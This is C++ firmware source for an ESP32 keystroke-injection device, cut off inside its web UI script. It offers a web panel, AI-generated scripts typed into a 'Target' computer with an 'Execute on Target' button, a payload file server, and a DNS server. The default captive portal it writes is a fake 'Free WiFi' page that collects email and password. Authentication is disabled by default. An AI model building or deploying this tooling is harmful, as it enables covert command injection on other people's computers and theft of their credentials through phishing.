#include "esp_event.h"
#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <SPI.h>
#include <SD.h>
#include <ArduinoJson.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include <WiFiUdp.h>
#include "LCD_Driver.h"
#include "GUI_Paint.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

// ============================================================================
// CONFIGURATION - IMPORTANT: Configure via settings.json on SD card
// ============================================================================
// SECURITY: All credentials should be stored in settings.json on the SD card
// Do NOT hardcode credentials in this file before committing to version control
// 
// Example settings.json:
// {
//   "ssid": "YourWiFiName",
//   "password": "YourWiFiPassword",
//   "openai_api_key": "sk-your-api-key-here",
//   "auth_username": "admin",
//   "auth_password": "your-secure-password"
// }

// Pin definitions for SD card SPI
#define SPI1_SCK 36
#define SPI1_MISO 37
#define SPI1_MOSI 35
#define SPI1_SS 34

// ============================================================================
// Global Variables
// ============================================================================
SPIClass spi1(HSPI);
File uploadFile;
USBHIDKeyboard Keyboard;
WebServer server(80);

WiFiClient feedbackClient; 
String feedbackMessage = "";
String requestLogBuffer = "";

// Settings structure with safe defaults
struct Settings {

    String ssid = "";                    // Configure in settings.json
    String password = "";                // Configure in settings.json
    String openai_api_key = "";          // Configure in settings.json

    String auth_username = "admin";      // Change this!
    String auth_password = "changeme";   // Change this!



    String model = "gpt-4o";
    int max_completion_tokens = 1000;
    float temperature = 0.40f;
    float top_p = 1.00f;
    float frequency_penalty = 0.00f;
    float presence_penalty = 0.00f;
    int typing_delay = 200;
    int command_delay = 150;
    int add_more_delay = 0;
    bool auth_enabled = false;
};

Settings settings;

// ============================================================================
// System Configuration for Network Modes
// ============================================================================
struct SystemConfig {
    bool rndisEnabled = false;           // True = Transparent NAT, False = Airgapped
    bool adblockEnabled = true;          // True = Drop domains in blocklist
    bool dnsServerEnabled = true;        // Enable DNS server on port 53
    String activePortal = "/portals/default.html";  // Currently active captive portal
    String dnsUpstream = "1.1.1.1";      // Upstream DNS server

    // Secure Browser Settings
    int browserTimeout = 10000;          // HTTP timeout in ms
    int browserMaxSize = 50000;          // Max response size in bytes
    bool browserStripImages = true;      // Replace images with placeholders
    bool browserStripForms = false;      // Remove form elements
    String browserUserAgent = "Mozilla/5.0 (compatible; ESP32-SecureBrowser/1.0)";
};

SystemConfig sysConfig;

// Bloom Filter for DNS blocklist (memory-efficient ad blocking)
const uint32_t BLOOM_SIZE = 8192;        // 8KB bloom filter (65536 bits)
const uint8_t BLOOM_HASH_COUNT = 3;      // Number of hash functions
uint8_t bloomFilter[BLOOM_SIZE];
bool bloomFilterLoaded = false;

// DNS Server
WiFiUDP dnsUdp;
const int DNS_PORT = 53;
bool dnsServerRunning = false;
unsigned long dnsBlockedCount = 0;
unsigned long dnsForwardedCount = 0;

const int buttonPin = 0;

// ============================================================================
// Function Prototypes
// ============================================================================
// Core functions
void initializeSD();
void connectToWiFi();
void startWebServer();
void loadSettings();
void saveSettings();
void displayOnLCD(const String& message);
 
// Authentication
bool checkAuth();
bool isValidPath(const String& path);

// HTTP Handlers
void handleRoot();
void handleLogin();
void handleLogout();
void handleNotFoundRouter();
void handleSettingsPage();
void handleSettings();
void handleFileManagerPage();
void handleDuckyPage();
void handleStatus();
void handleFeedback();
void handleEvents();
void handleSysInfo();
void handleGetLogs();
void handleGetFileOrDir();
void handleDeleteFile();
void handleCreateDir();
void handleCreateFile();
void handleSaveScript();
void handleDeleteScript();
void handleListScripts();
void handleExecuteScript();
void handleSubmit();
void handleExecuteDucky();
void handleConvertPowerShell();
void handleFileUpload();
void handleFormatSD();
void handleFileServer();
void handleTestTyping();
void testTypingSpeed();
 
// Helper functions
void logRequest(WebServer& svr);
void pushSseEvent(const String& eventName, const String& data);
String sendToOpenAI(const String& query, const String& systemPrompt);
String createJsonPayload(const String& userContent, const String& systemPrompt);
String extractContentField(const String& response);
String getScriptList();
String convertPowerShellToSingleCommand(const String& multiLineScript);
String parseAndExecuteAiResponse(const String& aiResponse);
String extractTagContent(const String& source, const String& tagName);

// Keyboard functions
void sendKeyboardText(const String& text);
void executeScriptViaCmd(const String& content);
void executeDuckyScript(const String& script);

// Network Mode Functions
void loadSystemConfig();
void saveSystemConfig();
void initBloomFilter();
void addToBloomFilter(const String& domain);
bool checkBloomFilter(const String& domain);
uint32_t hash1(const String& str);
uint32_t hash2(const String& str);
uint32_t hash3(const String& str);

// Portal IDE Handlers
void handlePortalIDE();
void handleApiPortalsList();
void handleApiPortalsLoad();
void handleApiPortalsSave();
void handleApiPortalsDelete();
void handleApiPortalsSetActive();
void handleApiSystemConfig();

// Text-Only Browser Handlers
void handleBrowser();
void handleProxyFetch();
void handleBrowserSettings();
String sanitizeHtml(const String& html, const String& baseUrl);
String rewriteLinks(const String& html, const String& baseUrl);

// DNS Server Functions
void startDnsServer();
void stopDnsServer();
void handleDnsRequest();
void sendDnsResponse(IPAddress &clientIP, uint16_t clientPort, uint8_t* buffer, int len, bool blocked);
String extractDomainFromDns(uint8_t* buffer, int len);

// Blocklist Editor Handlers
void handleBlocklistEditor();
void handleApiBlocklistList();
void handleApiBlocklistLoad();
void handleApiBlocklistSave();
void handleApiBlocklistDelete();
void handleApiBlocklistReload();
void handleApiDnsStats();

// ============================================================================
// Setup and Main Loop
// ============================================================================
void setup() {
    pinMode(buttonPin, INPUT_PULLUP);
    Config_Init();
    LCD_Init();
    LCD_SetBacklight(100);
    Paint_NewImage(LCD_WIDTH, LCD_HEIGHT, 270, WHITE);
    Paint_SetRotate(270);
    LCD_Clear(WHITE);
    Serial.begin(115200);

    displayOnLCD("Init Keyboard");
    Keyboard.begin();
    USB.begin();
   
    displayOnLCD("Init SD Card");
    initializeSD();

    displayOnLCD("Load Settings");
    loadSettings();

    displayOnLCD("Load SysConfig");
    loadSystemConfig();
    initBloomFilter();

    displayOnLCD("Connecting WiFi");
    connectToWiFi();

    displayOnLCD("Start Server");
    startWebServer();

    displayOnLCD("Start DNS");
    if (sysConfig.dnsServerEnabled) {
        startDnsServer();
    }

    displayOnLCD(WiFi.localIP().toString());
}

void loop() {
    server.handleClient();

    // Handle DNS requests if server is running
    if (dnsServerRunning) {
        handleDnsRequest();
    }

    delay(2);
}

// ============================================================================
// Initialization Functions
// ============================================================================
void initializeSD() {
    spi1.begin(SPI1_SCK, SPI1_MISO, SPI1_MOSI, SPI1_SS);

    if (!SD.begin(SPI1_SS, spi1)) {
        Serial.println("SD Card initialization failed!");
        displayOnLCD("SD FAILED!");
        return;
    }

    Serial.println("SD Card initialized.");

    // Create required directories
    if (!SD.exists("/scripts")) SD.mkdir("/scripts");
    if (!SD.exists("/ducky_scripts")) SD.mkdir("/ducky_scripts");
    if (!SD.exists("/payloads")) SD.mkdir("/payloads");

    // Create networking directories
    if (!SD.exists("/portals")) SD.mkdir("/portals");
    if (!SD.exists("/blocklists")) SD.mkdir("/blocklists");
    if (!SD.exists("/config")) SD.mkdir("/config");
    if (!SD.exists("/www")) SD.mkdir("/www");

    // Create default portal if not exists
    if (!SD.exists("/portals/default.html")) {
        File f = SD.open("/portals/default.html", FILE_WRITE);
        if (f) {
            f.print(R"(<!DOCTYPE html>
<html><head><title>Welcome</title>
<style>body{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#16213e;padding:40px;border-radius:12px;text-align:center;max-width:400px}
h1{color:#e94560}input{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:1px solid #0f3460;background:#1a1a2e;color:#eee}
button{width:100%;padding:14px;background:#00bf63;border:none;border-radius:8px;color:#fff;cursor:pointer;font-weight:bold}</style></head>
<body><div class="container"><h1>Free WiFi</h1><p>Enter your email to continue</p>
<form method="POST" action="/capture"><input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button></form></div></body></html>)");
            f.close();
        }
    }
}

void connectToWiFi() {
    if (settings.ssid.length() == 0) {
        Serial.println("ERROR: No WiFi SSID configured!");
        Serial.println("Create settings.json on SD card with your WiFi credentials.");
        displayOnLCD("NO WiFi CFG!");
        return;
    }
    
    WiFi.begin(settings.ssid.c_str(), settings.password.c_str());
    Serial.print("Connecting to: ");
    Serial.println(settings.ssid);
    
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 40) {
        delay(500);
        Serial.print(".");
        attempts++;
    }
    
    if (WiFi.status() == WL_CONNECTED) {
        Serial.println("\nWiFi Connected!");
        Serial.print("IP: ");
        Serial.println(WiFi.localIP());
    } else {
        Serial.println("\nWiFi connection failed!");
        displayOnLCD("WiFi FAILED!");
    }
}

// ============================================================================
// Authentication Functions
// ============================================================================
bool checkAuth() {
    if (!settings.auth_enabled) return true;
    
    if (!server.authenticate(settings.auth_username.c_str(), settings.auth_password.c_str())) {
        server.requestAuthentication();
        return false;
    }
    return true;
}

 





void handleLogin() {
    if (server.hasArg("username") && server.hasArg("password")) {
        if (server.arg("username") == settings.auth_username && 
            server.arg("password") == settings.auth_password) {
            server.sendHeader("Location", "/");
            server.send(302, "text/plain", "OK");
            return;
        }
    }
    
    String html = R"(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login - ESP32</title>
<style>
body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
form{background:#16213e;padding:40px;border-radius:12px;color:#eaeaea;box-shadow:0 4px 20px rgba(0,0,0,.3)}
input{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:1px solid #0f3460;background:#1a1a2e;color:#eaeaea;box-sizing:border-box}
button{width:100%;padding:14px;background:#00bf63;border:none;border-radius:8px;color:#fff;cursor:pointer;font-weight:bold;font-size:1rem}
button:hover{opacity:0.9}
h2{text-align:center;margin-top:0;color:#e94560}
</style></head><body>
<form method="POST" action="/login">
<h2>ESP32 Login</h2>
<input name="username" placeholder="Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Login</button>
</form></body></html>)";
    server.send(401, "text/html", html);
}

void handleLogout() {
    server.sendHeader("Location", "/login");
    server.send(302, "text/plain", "Logged out");
}

// ============================================================================
// Path Validation (Security)
// ============================================================================
bool isValidPath(const String& path) {
    if (path.indexOf("..") != -1) return false;
    if (path.indexOf("//") != -1) return false;
    if (!path.startsWith("/")) return false;
    for (int i = 0; i < path.length(); i++) {
        if (path.charAt(i) == '\0') return false;
    }
    return true;
}

// ============================================================================
// Web Server Setup
// ============================================================================
void startWebServer() {
    // Public endpoint
    server.on("/login", HTTP_GET, handleLogin);
    server.on("/login", HTTP_POST, handleLogin);
    server.on("/logout", handleLogout);
    
    // Protected endpoints
    server.on("/", handleRoot);
    server.on("/settings_page", HTTP_GET, handleSettingsPage);
    server.on("/file_manager", HTTP_GET, handleFileManagerPage);
    server.on("/ducky", HTTP_GET, handleDuckyPage);
    server.on("/typing_benchmark", HTTP_GET, handleTestTyping); 
    
    server.on("/status", HTTP_GET, handleStatus);
    server.on("/feedback", HTTP_POST, handleFeedback);
    server.on("/events", HTTP_GET, handleEvents);
    server.on("/sysinfo", HTTP_POST, handleSysInfo);
    server.on("/get_logs", HTTP_GET, handleGetLogs);

    server.on("/files", HTTP_GET, handleGetFileOrDir);
    server.on("/delete_file", HTTP_POST, handleDeleteFile);
    server.on("/create_file", HTTP_POST, handleCreateFile);
    server.on("/create_dir", HTTP_POST, handleCreateDir);

    server.on("/execute_ducky", HTTP_POST, handleExecuteDucky);
    server.on("/submit", HTTP_POST, handleSubmit);
    server.on("/settings", HTTP_POST, handleSettings);
    server.on("/settings", HTTP_GET, handleSettings);
    server.on("/execute", HTTP_POST, handleExecuteScript);
    server.on("/save_script", HTTP_POST, handleSaveScript);
    server.on("/delete_script", HTTP_POST, handleDeleteScript);
    server.on("/list_scripts", HTTP_GET, handleListScripts);
    server.on("/format_sd", HTTP_POST, handleFormatSD);
    server.on("/convert_powershell", HTTP_POST, handleConvertPowerShell);

    // Portal IDE endpoints
    server.on("/ide/portal", HTTP_GET, handlePortalIDE);
    server.on("/api/portals/list", HTTP_GET, handleApiPortalsList);
    server.on("/api/portals/load", HTTP_GET, handleApiPortalsLoad);
    server.on("/api/portals/save", HTTP_POST, handleApiPortalsSave);
    server.on("/api/portals/delete", HTTP_POST, handleApiPortalsDelete);
    server.on("/api/portals/set_active", HTTP_POST, handleApiPortalsSetActive);

    // System config endpoint
    server.on("/api/system/config", HTTP_GET, handleApiSystemConfig);
    server.on("/api/system/config", HTTP_POST, handleApiSystemConfig);

    // Text-only browser endpoints
    server.on("/browser", HTTP_GET, handleBrowser);
    server.on("/browser/settings", HTTP_GET, handleBrowserSettings);
    server.on("/browser/settings", HTTP_POST, handleBrowserSettings);
    server.on("/proxy/fetch", HTTP_GET, handleProxyFetch);

    // Blocklist editor endpoints
    server.on("/blocklist", HTTP_GET, handleBlocklistEditor);
    server.on("/api/blocklist/list", HTTP_GET, handleApiBlocklistList);
    server.on("/api/blocklist/load", HTTP_GET, handleApiBlocklistLoad);
    server.on("/api/blocklist/save", HTTP_POST, handleApiBlocklistSave);
    server.on("/api/blocklist/delete", HTTP_POST, handleApiBlocklistDelete);
    server.on("/api/blocklist/reload", HTTP_POST, handleApiBlocklistReload);
    server.on("/api/dns/stats", HTTP_GET, handleApiDnsStats);

    server.on("/upload", HTTP_POST, []() {
        if (!checkAuth()) return;
        logRequest(server);
        server.send(200, "text/plain", "File uploaded");
    }, handleFileUpload);

    server.onNotFound(handleNotFoundRouter);
    server.begin();
    Serial.println("HTTP server started");
}

// ============================================================================
// Settings Management
// ============================================================================
void loadSettings() {
    File file = SD.open("/settings.json");
    if (!file) {
        Serial.println("No settings.json - using defaults");
        Serial.println("IMPORTANT: Create settings.json with your WiFi and API credentials!");
        return;
    }
    
    JsonDocument doc;
    if (deserializeJson(doc, file)) {
        Serial.println("Failed to parse settings.json");
        file.close();
        return;
    }
    
    settings.ssid = doc["ssid"] | settings.ssid;
    settings.password = doc["password"] | settings.password;
    settings.openai_api_key = doc["openai_api_key"] | settings.openai_api_key;
    settings.model = doc["model"] | settings.model;
    settings.auth_username = doc["auth_username"] | settings.auth_username;
    settings.auth_password = doc["auth_password"] | settings.auth_password;
    settings.max_completion_tokens = doc["max_completion_tokens"] | settings.max_completion_tokens;
    settings.temperature = doc["temperature"] | settings.temperature;
    settings.top_p = doc["top_p"] | settings.top_p;
    settings.frequency_penalty = doc["frequency_penalty"] | settings.frequency_penalty;
    settings.presence_penalty = doc["presence_penalty"] | settings.presence_penalty;
    settings.typing_delay = doc["typing_delay"] | settings.typing_delay;
    settings.command_delay = doc["command_delay"] | settings.command_delay;
    settings.add_more_delay = doc["add_more_delay"] | settings.add_more_delay;
    settings.auth_enabled = doc["auth_enabled"] | settings.auth_enabled;
    
    file.close();
    Serial.println("Settings loaded from SD card");
}

void saveSettings() {
    File file = SD.open("/settings.json", FILE_WRITE);
    if (!file) {
        Serial.println("Failed to open settings.json for writing");
        return;
    }
    
    JsonDocument doc;
    doc["ssid"] = settings.ssid;
    doc["password"] = settings.password;
    doc["openai_api_key"] = settings.openai_api_key;
    doc["model"] = settings.model;
    doc["auth_username"] = settings.auth_username;
    doc["auth_password"] = settings.auth_password;
    doc["max_completion_tokens"] = settings.max_completion_tokens;
    doc["typing_delay"] = settings.typing_delay;
    doc["command_delay"] = settings.command_delay;
    doc["add_more_delay"] = settings.add_more_delay;
    doc["auth_enabled"] = settings.auth_enabled;
    
    char buf[10];
    snprintf(buf, sizeof(buf), "%.2f", settings.temperature); doc["temperature"] = buf;
    snprintf(buf, sizeof(buf), "%.2f", settings.top_p); doc["top_p"] = buf;
    snprintf(buf, sizeof(buf), "%.2f", settings.frequency_penalty); doc["frequency_penalty"] = buf;
    snprintf(buf, sizeof(buf), "%.2f", settings.presence_penalty); doc["presence_penalty"] = buf;
    
    serializeJson(doc, file);
    file.close();
    Serial.println("Settings saved");
}

void handleSettings() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (server.method() == HTTP_POST) {
        JsonDocument doc;
        if (deserializeJson(doc, server.arg("plain"))) {
            server.send(400, "text/plain", "Invalid JSON");
            return;
        }
        
        if (doc.containsKey("ssid")) settings.ssid = doc["ssid"].as<String>();
        if (doc.containsKey("password") && doc["password"].as<String>() != "********") 
            settings.password = doc["password"].as<String>();
        if (doc.containsKey("openai_api_key") && !doc["openai_api_key"].as<String>().startsWith("sk-..."))
            settings.openai_api_key = doc["openai_api_key"].as<String>();
        if (doc.containsKey("model")) settings.model = doc["model"].as<String>();
        if (doc.containsKey("auth_username")) settings.auth_username = doc["auth_username"].as<String>();
        if (doc.containsKey("auth_password") && doc["auth_password"].as<String>() != "********")
            settings.auth_password = doc["auth_password"].as<String>();
        if (doc.containsKey("max_completion_tokens")) settings.max_completion_tokens = doc["max_completion_tokens"];
        if (doc.containsKey("temperature")) settings.temperature = doc["temperature"];
        if (doc.containsKey("typing_delay")) settings.typing_delay = doc["typing_delay"];
        if (doc.containsKey("command_delay")) settings.command_delay = doc["command_delay"];
        
        saveSettings();
        server.send(200, "text/plain", "Settings saved");
    } else {
        JsonDocument doc;
        doc["ssid"] = settings.ssid;
        doc["password"] = settings.password.length() > 0 ? "********" : "";
        doc["openai_api_key"] = settings.openai_api_key.length() > 0 ? "sk-...configured" : "";
        doc["model"] = settings.model;
        doc["auth_username"] = settings.auth_username;
        doc["auth_password"] = settings.auth_password.length() > 0 ? "********" : "";
        doc["max_completion_tokens"] = settings.max_completion_tokens;
        doc["temperature"] = settings.temperature;
        doc["typing_delay"] = settings.typing_delay;
        doc["command_delay"] = settings.command_delay;
        
        String jsonString;
        serializeJson(doc, jsonString);
        server.send(200, "application/json", jsonString);
    }
}

// ============================================================================
// Logging Functions
// ============================================================================
void logRequest(WebServer& svr) {
    if (requestLogBuffer.length() > 2048) {
        requestLogBuffer = requestLogBuffer.substring(requestLogBuffer.length() - 1024);
    }
    
    String clientIP = svr.client().remoteIP().toString();
    String method = (svr.method() == HTTP_GET) ? "GET" : (svr.method() == HTTP_POST) ? "POST" : "OTHER";
    String log = "[" + clientIP + "] " + method + " " + svr.uri() + "\n";
    requestLogBuffer += log;
    Serial.print(log);
}

void handleGetLogs() {
    if (!checkAuth()) return;
    
    if (requestLogBuffer.length() > 0) {
        String temp = requestLogBuffer;
        requestLogBuffer = "";
        server.send(200, "text/plain", temp);
    } else {
        server.send(200, "text/plain", "");
    }
}

void pushSseEvent(const String& eventName, const String& data) {
    if (feedbackClient && feedbackClient.connected()) {
        feedbackClient.print("event: " + eventName + "\n");
        feedbackClient.print("data: " + data + "\n\n");
        feedbackClient.flush();
    }
}

// ============================================================================
// Status and Events Handlers
// ============================================================================
void handleStatus() {
    if (!checkAuth()) return;
    logRequest(server);
    
    JsonDocument doc;
    doc["ssid"] = WiFi.SSID();
    doc["rssi"] = WiFi.RSSI();
    doc["ip"] = WiFi.localIP().toString();
    doc["free_sd"] = (SD.totalBytes() - SD.usedBytes()) / (1024 * 1024);
    doc["total_sd"] = SD.totalBytes() / (1024 * 1024);
    doc["heap"] = ESP.getFreeHeap();
    
    String jsonString;
    serializeJson(doc, jsonString);
    server.send(200, "application/json", jsonString);
}

void handleFeedback() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (server.hasArg("plain")) {
        pushSseEvent("message", server.arg("plain"));
        server.send(200, "text/plain", "OK");
    } else {
        server.send(400, "text/plain", "Bad Request");
    }
}

void handleEvents() {
    if (!checkAuth()) return;
    
    feedbackClient = server.client();
    feedbackClient.setNoDelay(true);
    server.sendHeader("Content-Type", "text/event-stream");
    server.sendHeader("Cache-Control", "no-cache");
    server.send(200);

    while (feedbackClient.connected()) {
        if (feedbackMessage != "") {
            pushSseEvent("message", feedbackMessage);
            feedbackMessage = "";
        }
        delay(100);
    }
}

void handleSysInfo() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (server.hasArg("plain")) {
        pushSseEvent("sysinfo", server.arg("plain"));
        server.send(200, "text/plain", "OK");
    } else {
        server.send(400, "text/plain", "Bad Request");
    }
}

// ============================================================================
// File Operation Handlers
// ============================================================================
void handleCreateFile() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (!server.hasArg("path")) {
        server.send(400, "text/plain", "Missing path");
        return;
    }
    
    String path = server.arg("path");
    if (!isValidPath(path)) {
        server.send(400, "text/plain", "Invalid path");
        return;
    }
    
    if (SD.exists(path)) {
        server.send(409, "text/plain", "Already exists");
        return;
    }
    
    File file = SD.open(path, FILE_WRITE);
    if (file) {
        file.close();
        server.send(201, "text/plain", "Created");
    } else {
        server.send(500, "text/plain", "Create failed");
    }
}

void handleCreateDir() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (!server.hasArg("path")) {
        server.send(400, "text/plain", "Missing path");
        return;
    }
    
    String path = server.arg("path");
    if (!isValidPath(path)) {
        server.send(400, "text/plain", "Invalid path");
        return;
    }
    
    if (SD.exists(path)) {
        server.send(409, "text/plain", "Already exists");
        return;
    }
    
    if (SD.mkdir(path)) {
        server.send(201, "text/plain", "Created");
    } else {
        server.send(500, "text/plain", "Create failed");
    }
}

void handleGetFileOrDir() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (!server.hasArg("path")) {
        server.send(400, "text/plain", "Missing path");
        return;
    }
    
    String path = server.arg("path");
    if (!path.startsWith("/")) path = "/" + path;
    if (!isValidPath(path)) {
        server.send(400, "text/plain", "Invalid path");
        return;
    }
    
    File file = SD.open(path);
    if (!file) {
        server.send(404, "text/plain", "Not found");
        return;
    }
    
    if (file.isDirectory()) {
        String json = "[";
        File entry = file.openNextFile();
        while (entry) {
            if (json != "[") json += ",";
            String name = String(entry.name());
            json += "{\"type\":\"" + String(entry.isDirectory() ? "dir" : "file") + "\",";
            json += "\"name\":\"" + name.substring(name.lastIndexOf('/') + 1) + "\",";
            json += "\"size\":" + String(entry.size()) + "}";
            entry.close();
            entry = file.openNextFile();
        }
        json += "]";
        file.close();
        server.send(200, "application/json", json);
    } else {
        server.streamFile(file, "text/plain");
        file.close();
    }
}

void handleDeleteFile() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (!server.hasArg("path")) {
        server.send(400, "text/plain", "Missing path");
        return;
    }
    
    String path = server.arg("path");
    if (!isValidPath(path) || path == "/") {
        server.send(403, "text/plain", "Forbidden");
        return;
    }
    
    if (SD.remove(path) || SD.rmdir(path)) {
        server.send(200, "text/plain", "Deleted");
    } else {
        server.send(500, "text/plain", "Delete failed");
    }
}

void handleFileServer() {
    String uri = server.uri();
    if (uri.startsWith("/f/") && isValidPath(uri)) {
        String sdPath = "/payloads" + uri.substring(2);
        logRequest(server);
        if (SD.exists(sdPath)) {
            File file = SD.open(sdPath, FILE_READ);
            server.streamFile(file, "application/octet-stream");
            file.close();
        } else {
            server.send(404, "text/plain", "Not found");
        }
    } else {
        server.send(403, "text/plain", "Forbidden");
    }
}





// ============================================================================
// HTML PAGE HANDLERS - Updated UI with modern design, toast notifications,
// improved responsiveness, and better UX
// ============================================================================

void handleRoot() {
    if (!checkAuth()) return;
    logRequest(server);
    
    String html = R"WEBUI(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32 Advanced Control</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
    <script src="https://cdn.jsdelivr.net/npm/monaco-editor@0.34.0/min/vs/loader.js"></script>
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--danger:#ff6b6b;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);line-height:1.6}
        .container{max-width:1400px;margin:auto;padding:15px}
        header{background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:20px;border-radius:12px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
        header h1{font-size:1.4rem;display:flex;align-items:center;gap:10px}
        header h1::before{content:"⚡";font-size:1.6rem}
        nav{display:flex;gap:8px;flex-wrap:wrap}
        nav a{color:var(--text);text-decoration:none;padding:8px 16px;border-radius:8px;background:rgba(255,255,255,0.1);transition:all .2s;font-size:0.9rem}
        nav a:hover{background:var(--accent);transform:translateY(-2px)}
        .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:15px}
        .card{background:var(--card);border-radius:12px;padding:20px;box-shadow:0 4px 20px rgba(0,0,0,.3);display:flex;flex-direction:column}
        .card h2{margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid var(--accent);font-size:1.1rem;display:flex;align-items:center;gap:8px}
        input,select,button,textarea{width:100%;padding:12px;margin-bottom:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.95rem;transition:border-color .2s}
        input:focus,select:focus,textarea:focus{outline:none;border-color:var(--accent)}
        button{background:var(--secondary);border:none;cursor:pointer;font-weight:600;transition:all .2s}
        button:hover{background:var(--accent);transform:translateY(-1px)}
        button:active{transform:translateY(0)}
        button.success{background:var(--success)}
        button.danger{background:var(--danger)}
        .status-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
        .status-item{background:var(--bg);padding:10px;border-radius:8px}
        .info-label{color:var(--dim);font-size:0.8rem;display:block}
        .info-value{font-weight:600;font-size:0.95rem}
        .admin-true{color:var(--success);font-weight:bold}
        .admin-false{color:var(--danger);font-weight:bold}
        #editorContainer{width:100%;height:350px;border:1px solid var(--border);border-radius:8px;margin-bottom:10px;overflow:hidden}
        .log-panel{background:var(--bg);height:180px;overflow-y:auto;padding:12px;border-radius:8px;font-family:'Fira Code','Courier New',monospace;font-size:0.85rem;white-space:pre-wrap;flex-grow:1}
        .log-panel:empty::before{content:'Waiting for data...';color:var(--dim)}
        .chat-message{margin-bottom:12px;animation:fadeIn .3s}
        .chat-message pre{white-space:pre-wrap;word-wrap:break-word;margin-top:8px;padding:12px;background:var(--bg);border-radius:8px;border-left:3px solid var(--accent)}
        .btn-group{display:flex;gap:8px}
        .btn-group button{flex:1}
        .full-width{grid-column:1/-1}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999;animation:slideIn .3s;box-shadow:0 4px 12px rgba(0,0,0,.3)}
        .toast.success{background:var(--success)}
        .toast.error{background:var(--danger)}
        .toast.info{background:var(--secondary)}
        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        @media(max-width:768px){.grid{grid-template-columns:1fr}header{flex-direction:column;text-align:center}nav{justify-content:center}.btn-group{flex-direction:column}}
        .loading{position:relative;pointer-events:none;opacity:0.7}
        .loading::after{content:"";position:absolute;top:50%;left:50%;width:20px;height:20px;border:2px solid var(--accent);border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>ESP32 Advanced Control</h1>
            <nav>
                <a href="/settings_page">⚙️ Settings</a>
                <a href="/ducky">🦆 Ducky Studio</a>
                <a href="/file_manager">📁 Files</a>
                <a href="/ide/portal">🌐 Portal IDE</a>
                <a href="/blocklist">🛡️ Blocklist</a>
                <a href="/browser">🔒 Browser</a>
                <a href="/logout">🚪 Logout</a>
            </nav>
        </header>
        <div class="grid">
            <div class="card full-width">
                <h2>📊 Target System Information</h2>
                <div class="status-grid">
                    <div class="status-item"><span class="info-label">Hostname</span><span id="info-hostname" class="info-value">...</span></div>
                    <div class="status-item"><span class="info-label">User</span><span id="info-user" class="info-value">...</span> <span id="info-admin">...</span></div>
                    <div class="status-item"><span class="info-label">Operating System</span><span id="info-os" class="info-value">...</span></div>
                    <div class="status-item"><span class="info-label">Architecture</span><span id="info-arch" class="info-value">...</span></div>
                </div>
            </div>
            <div class="card">
                <h2>📡 Live Command Output</h2>
                <div id="output-log" class="log-panel"></div>
            </div>
            <div class="card">
                <h2>📋 Incoming Request Log</h2>
                <div id="device-log-panel" class="log-panel"></div>
            </div>
            <div class="card">
                <h2>🤖 AI Assistant</h2>
                <div id="chatbox" class="log-panel"></div>
                <input type="text" id="userInput" placeholder="Ask AI to generate a script..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button type="button" onclick="sendMessage()">Send to AI</button>
            </div>
            <div class="card">
                <h2>📶 Device Status</h2>
                <div class="status-grid">
                    <div class="status-item"><span class="info-label">ESP32 IP</span><span id="status-ip" class="info-value">...</span></div>
                    <div class="status-item"><span class="info-label">Signal Strength</span><span id="status-rssi" class="info-value">...</span></div>
                    <div class="status-item"><span class="info-label">Network</span><span id="status-ssid" class="info-value">...</span></div>
                    <div class="status-item"><span class="info-label">SD Card</span><span id="status-sd" class="info-value">...</span></div>
                </div>
            </div>
            <div class="card full-width">
                <h2>📝 Script Editor</h2>
                <select id="scriptList" onchange="loadScript()"></select>
                <input type="text" id="scriptName" placeholder="Enter new script name">
                <div id="editorContainer"></div>
                <div class="btn-group">
                    <button type="button" class="success" onclick="saveScript()">💾 Save Script</button>
                    <button type="button" class="danger" onclick="deleteScript()">🗑️ Delete Script</button>
                    <button type="button" onclick="executeScript()">▶️ Execute on Target</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        var scriptEditor;
        require.config({ paths: { 'vs': 'https://cdn.jsdelivr.net/npm/monaco-editor@0.34.0/min/vs' }});
